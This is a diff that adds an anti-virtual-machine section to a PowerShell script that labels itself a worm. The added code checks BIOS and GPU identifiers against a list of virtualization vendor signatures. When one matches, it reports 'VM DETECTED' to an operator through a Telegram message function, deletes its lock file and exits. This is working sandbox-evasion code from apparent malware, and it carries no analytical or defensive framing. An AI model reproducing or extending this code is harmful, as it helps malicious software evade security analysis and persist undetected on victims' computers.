@@ -96,6 +96,58 @@ function Send-TelegramMessage {
     }
 }
 #╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+#║						      ANTI VM                                                    ║
+#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+$virtualBiosSignatures = @(
+    "VMware",
+    "HOXKO3",
+    "VMW",
+    "Microsoft",
+    "Unknown",
+    "VGA",
+    "Development",
+    "Bochs",
+    "VirtualBox",
+    "Standard VGA",
+    "Xen",
+    "QEMU",
+    "Microsoft Corporation",
+    "Parallels",
+    "innotek GmbH",
+    "KVM",
+    "HVM domU",
+    "0.0.0",
+    "Oracle Corporation"
+)
+$biosInfo = Get-WmiObject -Class Win32_BIOS
+foreach ($bios in $biosInfo) {
+    $biosName = $bios.Name
+    $biosManufacturer = $bios.Manufacturer
+    $biosVersion = $bios.SMBIOSBIOSVersion
+    Write-Output "Checking BIOS: $biosName, Manufacturer: $biosManufacturer, Version: $biosVersion"
+    foreach ($signature in $virtualBiosSignatures) {
+        if ($biosName -like "*$signature*" -or $biosManufacturer -like "*$signature*" -or $biosVersion -like "*$signature*") {
+			# MSG
+			$message = " $($redExclamation) [WORM] VM DETECTED (BIOS)"
+			Send-TelegramMessage -message $message
+			Remove-Item -Path $lockFilePath
+			exit
+        }
+    }
+}
+$gpuInfo = Get-WmiObject -Query "Select * from Win32_VideoController"
+foreach ($gpu in $gpuInfo) {
+	foreach ($signature in $virtualBiosSignatures) {
+        if ($gpu.Name -like "*$signature*") {
+			# MSG
+			$message = "$($redExclamation) [WORM] VM DETECTED (GPU)"
+			Send-TelegramMessage -message $message
+			Remove-Item -Path $lockFilePath
+			exit
+        }
+    }
+}
+#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
 #║						     PARAMS                                                      ║
 #╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
 $port = 8080
